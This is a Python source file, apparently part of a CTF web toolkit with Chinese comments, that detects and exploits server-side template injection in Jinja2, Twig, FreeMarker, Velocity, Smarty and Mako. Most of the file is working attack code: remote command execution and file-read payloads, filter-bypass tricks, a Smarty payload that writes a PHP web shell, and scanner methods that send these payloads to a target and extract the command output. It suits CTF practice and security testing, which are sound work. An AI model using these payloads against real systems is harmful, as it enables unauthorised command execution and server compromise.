"""
CTF Web Toolkit - SSTI Detection & Exploitation Module
支持：Jinja2 / Twig / Smarty / FreeMarker / Velocity / Mako
"""

import re
from typing import Optional, List
from core.requester import Requester
from core.utils import ok, info, warn, err, found, section

# ── 探测 Payload（数学表达式验证）─────────────
DETECT_PAYLOADS = {
    "universal":  [("{{7*7}}", "49"), ("{7*7}", "49"), ("${7*7}", "49"),
                   ("#{7*7}", "49"), ("*{7*7}", "49"), ("<%= 7*7 %>", "49")],
    "jinja2":     [("{{7*'7'}}", "7777777")],
    "twig":       [("{{7*'7'}}", "49")],
    "freemarker": [("${7*7}", "49"), ("<#assign x=7*7>${x}", "49")],
    "velocity":   [("#set($x=7*7)${x}", "49")],
    "smarty":     [("{php}echo 7*7;{/php}", "49"), ("{{7*7}}", "49")],
    "mako":       [("${7*7}", "49")],
    "erb":        [("<%= 7*7 %>", "49")],
}

# ── Jinja2 RCE Payload ────────────────────────
JINJA2_RCE = {
    "read_file": [
        # 通过 __class__ 链
        "{{''.__class__.__mro__[1].__subclasses__()[{idx}]('{file}').read()}}",
        # 通过 config 对象
        "{{config.__class__.__init__.__globals__['os'].popen('{cmd}').read()}}",
        # 通过 lipsum
        "{{lipsum.__globals__['os'].popen('{cmd}').read()}}",
        # 通过 cycler
        "{{cycler.__init__.__globals__.os.popen('{cmd}').read()}}",
        # 通过 joiner
        "{{joiner.__init__.__globals__.os.popen('{cmd}').read()}}",
    ],
    "rce": [
        "{{''.__class__.__mro__[1].__subclasses__()[{idx}].__init__.__globals__['__builtins__']['__import__']('os').popen('{cmd}').read()}}",
        "{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='catch_warnings'%}{{c.__init__.__globals__['__builtins__'].eval(\"__import__('os').popen('{cmd}').read()\")}}{%endif%}{%endfor%}",
        "{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('{cmd}')|attr('read')()}}",
    ],
    # 绕过过滤器
    "filter_bypass": [
        # 绕过点号过滤
        "{{request|attr('application')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('{cmd}')|attr('read')()}}",
        # 绕过下划线过滤（使用 request.args）
        # 需要 ?_=__class__&__=__mro__ 传参
        "{{(request|attr(request.args.get('_')))|attr(request.args.get('__'))}}",
        # 字符串拼接绕过
        "{{'__cla'+'ss__'}}",
        # 使用 attr 过滤器
        "{{''|attr('__class__')|attr('__mro__')|list}}",
    ],
}

# ── Twig RCE Payload ──────────────────────────
TWIG_RCE = [
    "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('{cmd}')}}",
    "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('{cmd}')}}",
    "{%set sr=_self|lower%}{{sr.env.registerUndefinedFilterCallback('exec')}}{{sr.env.getFilter('{cmd}')}}",
]

# ── FreeMarker RCE Payload ────────────────────
FREEMARKER_RCE = [
    '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("{cmd}")}',
    "${\"freemarker.template.utility.Execute\"?new()('{cmd}')}",
]

# ── Velocity RCE Payload ──────────────────────
VELOCITY_RCE = [
    "#set($rt=$class.forName('java.lang.Runtime'))"
    "#set($proc=$rt.getMethod('exec',''.class.forName('java.lang.String[]'))"
    ".invoke($rt.getMethod('getRuntime').invoke(null),$str.split('{cmd}')))"
    "$proc.waitFor()",
]

# ── Smarty RCE Payload ────────────────────────
SMARTY_RCE = [
    "{php}system('{cmd}');{/php}",
    "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php system('{cmd}');?>\",self::clearConfig())}",
]


class SSTIScanner:
    def __init__(self, requester: Requester):
        self.req = requester

    def detect(self, url: str, param: str, method: str = "GET") -> Optional[str]:
        """检测 SSTI 并判断模板引擎类型"""
        section(f"SSTI 检测: {param}")
        for engine, payloads in DETECT_PAYLOADS.items():
            for payload, expected in payloads:
                resp = _send(self.req, url, param, payload, method)
                if resp and expected in resp.text:
                    found("SSTI 引擎", f"{engine} | payload={payload!r} | 响应含={expected!r}")
                    return engine
        info("未发现 SSTI")
        return None

    def fingerprint_jinja2(self, url: str, param: str, method: str = "GET") -> bool:
        """精确指纹识别 Jinja2 vs Twig"""
        # Jinja2: {{7*'7'}} = '7777777', Twig: {{7*'7'}} = '49'
        r = _send(self.req, url, param, "{{7*'7'}}", method)
        if r:
            if "7777777" in r.text:
                ok("模板引擎: Jinja2 (Python)")
                return True
            elif "49" in r.text:
                ok("模板引擎: Twig (PHP)")
                return False
        return False

    def dump_jinja2_subclasses(self, url: str, param: str,
                               method: str = "GET") -> List[str]:
        """枚举 Jinja2 所有子类"""
        section("枚举 Jinja2 子类")
        payload = "{{''.__class__.__mro__[1].__subclasses__()}}"
        resp = _send(self.req, url, param, payload, method)
        if not resp:
            return []
        classes = re.findall(r"<class '([^']+)'>", resp.text)
        info(f"找到 {len(classes)} 个子类")
        return classes

    def find_jinja2_rce_index(self, url: str, param: str,
                              method: str = "GET") -> Optional[int]:
        """查找可用于 RCE 的子类索引（如 subprocess.Popen）"""
        classes = self.dump_jinja2_subclasses(url, param, method)
        targets = ["subprocess.Popen", "os._wrap_close", "posix.wrap_close",
                   "catch_warnings", "_IterationGuard"]
        for i, cls in enumerate(classes):
            for t in targets:
                if t in cls:
                    found("RCE 子类", f"[{i}] {cls}")
                    return i
        return None

    def exploit_jinja2(self, url: str, param: str, cmd: str,
                       method: str = "GET") -> Optional[str]:
        """Jinja2 RCE 利用"""
        section(f"Jinja2 RCE: {cmd}")
        # 先尝试简单方式
        simple_payloads = [
            f"{{{{config.__class__.__init__.__globals__['os'].popen('{cmd}').read()}}}}",
            f"{{{{lipsum.__globals__['os'].popen('{cmd}').read()}}}}",
            f"{{{{cycler.__init__.__globals__.os.popen('{cmd}').read()}}}}",
        ]
        for p in simple_payloads:
            resp = _send(self.req, url, param, p, method)
            if resp and resp.text.strip():
                # 尝试提取输出
                output = _extract_output(resp.text, p)
                if output:
                    found("命令输出", output[:200])
                    return output
        # 尝试子类方式
        idx = self.find_jinja2_rce_index(url, param, method)
        if idx is not None:
            p = f"{{{{''.__class__.__mro__[1].__subclasses__()[{idx}].__init__.__globals__['__builtins__']['__import__']('os').popen('{cmd}').read()}}}}"
            resp = _send(self.req, url, param, p, method)
            if resp:
                output = _extract_output(resp.text, p)
                if output:
                    found("命令输出", output[:200])
                    return output
        err("Jinja2 RCE 利用失败")
        return None

    def exploit_twig(self, url: str, param: str, cmd: str,
                     method: str = "GET") -> Optional[str]:
        """Twig RCE 利用"""
        section(f"Twig RCE: {cmd}")
        for template in TWIG_RCE:
            p = template.format(cmd=cmd)
            resp = _send(self.req, url, param, p, method)
            if resp and resp.text.strip():
                found("命令输出", resp.text[:200])
                return resp.text
        return None

    def exploit_freemarker(self, url: str, param: str, cmd: str,
                           method: str = "GET") -> Optional[str]:
        """FreeMarker RCE 利用"""
        section(f"FreeMarker RCE: {cmd}")
        for template in FREEMARKER_RCE:
            p = template.format(cmd=cmd)
            resp = _send(self.req, url, param, p, method)
            if resp and resp.text.strip():
                found("命令输出", resp.text[:200])
                return resp.text
        return None

    def exploit_velocity(self, url: str, param: str, cmd: str,
                         method: str = "GET") -> Optional[str]:
        """Velocity RCE 利用（Java 环境）"""
        section(f"Velocity RCE: {cmd}")
        payloads = [
            # 通过 ProcessBuilder
            f"#set($sb=$class.forName('java.lang.StringBuilder').newInstance())"
            f"#set($proc=$class.forName('java.lang.Runtime').getMethod('exec',''.class.forName('java.lang.String[]'))"
            f".invoke($class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),"
            f"$str.split('{cmd}')))"
            f"#set($is=$proc.getInputStream())"
            f"#set($reader=$class.forName('java.io.BufferedReader').getDeclaredConstructors()[0].newInstance($class.forName('java.io.InputStreamReader').getDeclaredConstructors()[0].newInstance($is)))"
            f"#foreach($line in $reader.lines().iterator())$sb.append($line)#end"
            f"$sb.toString()",
            # 通过 tools 工具类
            f"$classloader.loadClass('java.lang.Runtime').getMethod('exec',''.class.forName('java.lang.String[]'))"
            f".invoke($classloader.loadClass('java.lang.Runtime').getMethod('getRuntime').invoke(null),"
            f"['sh','-c','{cmd}']).text",
        ]
        for p in payloads:
            resp = _send(self.req, url, param, p, method)
            if resp and resp.text.strip():
                found("命令输出", resp.text[:200])
                return resp.text
        err("Velocity RCE 利用失败")
        return None

    def exploit_smarty(self, url: str, param: str, cmd: str,
                       method: str = "GET") -> Optional[str]:
        """Smarty RCE 利用（PHP 环境）"""
        section(f"Smarty RCE: {cmd}")
        for template in SMARTY_RCE:
            p = template.format(cmd=cmd)
            resp = _send(self.req, url, param, p, method)
            if resp and resp.text.strip():
                found("命令输出", resp.text[:200])
                return resp.text
        # Smarty 4.x 新语法
        p4 = f"{{{{system('{cmd}')}}}}"
        resp = _send(self.req, url, param, p4, method)
        if resp and resp.text.strip():
            found("命令输出", resp.text[:200])
            return resp.text
        err("Smarty RCE 利用失败")
        return None

    def exploit_mako(self, url: str, param: str, cmd: str,
                     method: str = "GET") -> Optional[str]:
        """Mako RCE 利用（Python 环境）"""
        section(f"Mako RCE: {cmd}")
        payloads = [
            f"${{__import__('os').popen('{cmd}').read()}}",
            f"<%\nimport os\nx=os.popen('{cmd}').read()\n%>${{x}}",
            f"<%\nimport subprocess\nx=subprocess.check_output('{cmd}',shell=True).decode()\n%>${{x}}",
        ]
        for p in payloads:
            resp = _send(self.req, url, param, p, method)
            if resp and resp.text.strip():
                output = _extract_output(resp.text, p)
                if output:
                    found("命令输出", output[:200])
                    return output
        err("Mako RCE 利用失败")
        return None


# ── 内部辅助 ─────────────────────────────────
def _send(req: Requester, url: str, param: str, payload: str, method: str):
    try:
        if method.upper() == "GET":
            return req.get(url, params={param: payload})
        else:
            return req.post(url, data={param: payload})
    except Exception as e:
        err(f"请求失败: {e}")
        return None


def _extract_output(text: str, payload: str) -> Optional[str]:
    """从响应中提取命令输出（去除 payload 本身）"""
    # 查找不在 payload 中的内容
    lines = text.split('\n')
    for line in lines:
        line = line.strip()
        if line and line not in payload and len(line) > 2:
            if not any(tag in line for tag in ["<html", "<body", "<head", "<!DOCTYPE"]):
                return line
    return text[:500] if text.strip() else None
